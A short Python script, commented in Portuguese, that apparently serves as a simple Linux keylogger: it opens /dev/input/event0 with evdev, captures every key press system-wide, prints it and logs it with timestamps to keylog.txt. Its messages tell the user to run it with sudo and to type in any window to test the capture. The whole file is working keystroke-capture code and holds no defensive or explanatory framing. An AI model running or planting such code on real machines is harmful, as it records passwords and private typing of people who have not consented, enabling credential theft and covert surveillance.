import evdev
import logging
import sys

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def main():

    path = "/dev/input/event0" 
    
    print(f"[*] Tentando conectar ao dispositivo: {path}")

    try:
        device = evdev.InputDevice(path)
        print(f"[+] Sucesso! Monitorando: {device.name}")
        print("[!] Pressione CTRL+C para parar a captura.")
        print("[!] Digite algo em qualquer janela para testar...")


        for event in device.read_loop():
            if event.type == evdev.ecodes.EV_KEY:
                if event.value == 1: 
                    key_str = evdev.ecodes.KEY[event.code]
                    clean_key = key_str.replace("KEY_", "")
                    logging.info(clean_key)
                    print(f"Capturado: {clean_key}")

    except FileNotFoundError:
        print(f"[-] Erro: O arquivo {path} não existe.")
    except PermissionError:
        print("\n[!] ERRO DE PERMISSÃO: Você precisa rodar com 'sudo'.")
        print("    O Linux bloqueia leitura de hardware por usuários comuns.")
    except KeyboardInterrupt:
        print("\n[*] Encerrado pelo usuário.")

if __name__ == "__main__":
    main()
